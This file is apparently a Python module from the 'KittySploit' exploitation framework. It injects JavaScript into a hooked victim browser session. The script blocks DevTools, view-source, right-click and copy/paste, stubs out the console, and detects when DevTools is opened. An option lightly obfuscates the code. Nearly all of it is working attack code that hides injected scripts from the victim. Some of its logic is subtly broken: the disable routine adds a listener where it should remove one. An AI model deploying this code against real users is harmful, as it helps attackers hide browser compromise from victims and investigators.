from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Disable DevTools",
		"description": "Disable browser DevTools using multiple protection techniques (F12, right-click, keyboard shortcuts, etc.)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}	
	
	disable_f12 = OptBool(True, "Disable F12 key", False)
	disable_right_click = OptBool(True, "Disable right-click context menu", False)
	disable_shortcuts = OptBool(True, "Disable keyboard shortcuts (Ctrl+Shift+I, Ctrl+U, etc.)", False)
	disable_console = OptBool(True, "Disable console access", False)
	disable_selection = OptBool(False, "Disable text selection (may affect UX)", False)
	obfuscate_code = OptBool(True, "Obfuscate protection code to make it harder to bypass", False)

	def run(self):
		"""Disable DevTools using multiple protection techniques"""
		
		js_code = f"""
		(function() {{
			// Remove existing protection if present
			if (window.ksDevToolsProtection) {{
				window.ksDevToolsProtection.disable();
			}}
			
			const protection = {{
				enabled: true,
				
				// Disable F12
				disableF12: {str(self.disable_f12).lower()},
				
				// Disable right-click
				disableRightClick: {str(self.disable_right_click).lower()},
				
				// Disable shortcuts
				disableShortcuts: {str(self.disable_shortcuts).lower()},
				
				// Disable console
				disableConsole: {str(self.disable_console).lower()},
				
				// Disable selection
				disableSelection: {str(self.disable_selection).lower()},
				
				// Event handlers
				handlers: {{}},
				
				// Disable function
				disable: function() {{
					this.enabled = false;
					// Remove all event listeners
					if (this.handlers.keydown) {{
						document.removeEventListener('keydown', this.handlers.keydown, true);
					}}
					if (this.handlers.contextmenu) {{
						document.removeEventListener('contextmenu', this.handlers.contextmenu, true);
					}}
					if (this.handlers.selectstart) {{
						document.addEventListener('selectstart', this.handlers.selectstart, true);
					}}
					if (this.handlers.copy) {{
						document.removeEventListener('copy', this.handlers.copy, true);
					}}
					if (this.handlers.cut) {{
						document.removeEventListener('cut', this.handlers.cut, true);
					}}
					if (this.handlers.paste) {{
						document.removeEventListener('paste', this.handlers.paste, true);
					}}
				}},
				
				// Initialize protection
				init: function() {{
					// Disable F12 and other DevTools keys
					if (this.disableF12 || this.disableShortcuts) {{
						this.handlers.keydown = (e) => {{
							if (!this.enabled) return;
							
							// F12
							if (this.disableF12 && e.keyCode === 123) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+Shift+I (DevTools)
							if (this.disableShortcuts && e.ctrlKey && e.shiftKey && e.keyCode === 73) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+Shift+J (Console)
							if (this.disableShortcuts && e.ctrlKey && e.shiftKey && e.keyCode === 74) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+Shift+C (Inspect Element)
							if (this.disableShortcuts && e.ctrlKey && e.shiftKey && e.keyCode === 67) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+U (View Source)
							if (this.disableShortcuts && e.ctrlKey && e.keyCode === 85) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+S (Save Page)
							if (this.disableShortcuts && e.ctrlKey && e.keyCode === 83) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+P (Print - can reveal source)
							if (this.disableShortcuts && e.ctrlKey && e.keyCode === 80) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+Shift+P (Command Palette in DevTools)
							if (this.disableShortcuts && e.ctrlKey && e.shiftKey && e.keyCode === 80) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+Shift+K (Console in Firefox)
							if (this.disableShortcuts && e.ctrlKey && e.shiftKey && e.keyCode === 75) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
							
							// Ctrl+` (Console toggle)
							if (this.disableShortcuts && e.ctrlKey && e.keyCode === 192) {{
								e.preventDefault();
								e.stopPropagation();
								e.stopImmediatePropagation();
								return false;
							}}
						}};
						
						document.addEventListener('keydown', this.handlers.keydown, true);
					}}
					
					// Disable right-click
					if (this.disableRightClick) {{
						this.handlers.contextmenu = (e) => {{
							if (!this.enabled) return;
							e.preventDefault();
							e.stopPropagation();
							e.stopImmediatePropagation();
							return false;
						}};
						
						document.addEventListener('contextmenu', this.handlers.contextmenu, true);
					}}
					
					// Disable text selection
					if (this.disableSelection) {{
						this.handlers.selectstart = (e) => {{
							if (!this.enabled) return;
							e.preventDefault();
							return false;
						}};
						
						this.handlers.copy = (e) => {{
							if (!this.enabled) return;
							e.preventDefault();
							e.clipboardData.setData('text/plain', '');
							return false;
						}};
						
						this.handlers.cut = (e) => {{
							if (!this.enabled) return;
							e.preventDefault();
							return false;
						}};
						
						this.handlers.paste = (e) => {{
							if (!this.enabled) return;
							e.preventDefault();
							return false;
						}};
						
						document.addEventListener('selectstart', this.handlers.selectstart, true);
						document.addEventListener('copy', this.handlers.copy, true);
						document.addEventListener('cut', this.handlers.cut, true);
						document.addEventListener('paste', this.handlers.paste, true);
						
						// Disable selection via CSS
						document.body.style.userSelect = 'none';
						document.body.style.webkitUserSelect = 'none';
						document.body.style.mozUserSelect = 'none';
						document.body.style.msUserSelect = 'none';
					}}
					
					// Disable console access
					if (this.disableConsole) {{
						// Override console methods
						const noop = () => {{}};
						const methods = ['log', 'debug', 'info', 'warn', 'error', 'assert', 'clear', 'count', 'dir', 'dirxml', 'group', 'groupCollapsed', 'groupEnd', 'profile', 'profileEnd', 'table', 'time', 'timeEnd', 'timeStamp', 'trace'];
						
						methods.forEach(method => {{
							window.console[method] = noop;
						}});
						
						// Prevent console object access
						Object.defineProperty(window, 'console', {{
							get: function() {{
								return {{}};
							}},
							set: function() {{
								return false;
							}}
						}});
					}}
					
					// Detect DevTools opening (advanced technique)
					let devtools = false;
					const element = new Image();
					Object.defineProperty(element, 'id', {{
						get: function() {{
							devtools = true;
							protection.onDevToolsOpen();
						}}
					}});
					
					setInterval(() => {{
						devtools = false;
						console.log(element);
						if (devtools) {{
							protection.onDevToolsOpen();
						}}
					}}, 1000);
					
					// Detect window size change (DevTools often changes window size)
					let windowWidth = window.innerWidth;
					let windowHeight = window.innerHeight;
					
					setInterval(() => {{
						if (window.innerWidth !== windowWidth || window.innerHeight !== windowHeight) {{
							windowWidth = window.innerWidth;
							windowHeight = window.innerHeight;
							// Could trigger protection here
						}}
					}}, 500);
				}},
				
				onDevToolsOpen: function() {{
					if (!this.enabled) return;
				}}
			}};
			
			// Initialize protection
			protection.init();
			
			// Store globally for potential disable
			window.ksDevToolsProtection = protection;
			
			return 'DevTools protection enabled';
		}})();
		"""
		
		# Obfuscate code if requested
		if self.obfuscate_code:
			# Simple obfuscation: replace variable names and add comments
			import re
			# This is a simple obfuscation - in production you might want more advanced obfuscation
			js_code = js_code.replace('protection', 'p' + str(hash('protection') % 10000))
			js_code = js_code.replace('enabled', 'e' + str(hash('enabled') % 10000))
		
		# Inject the protection code
		result = self.send_js(js_code)
		
		if result:
			print_success("DevTools protection enabled!")
			print_info(f"F12: {'disabled' if self.disable_f12 else 'enabled'}")
			print_info(f"Right-click: {'disabled' if self.disable_right_click else 'enabled'}")
			print_info(f"Keyboard shortcuts: {'disabled' if self.disable_shortcuts else 'enabled'}")
			print_info(f"Console access: {'disabled' if self.disable_console else 'enabled'}")
			print_info(f"Text selection: {'disabled' if self.disable_selection else 'enabled'}")
			print_info(f"Code obfuscation: {'enabled' if self.obfuscate_code else 'disabled'}")
			
			return result
		else:
			print_error("Failed to inject DevTools protection code")
			return False

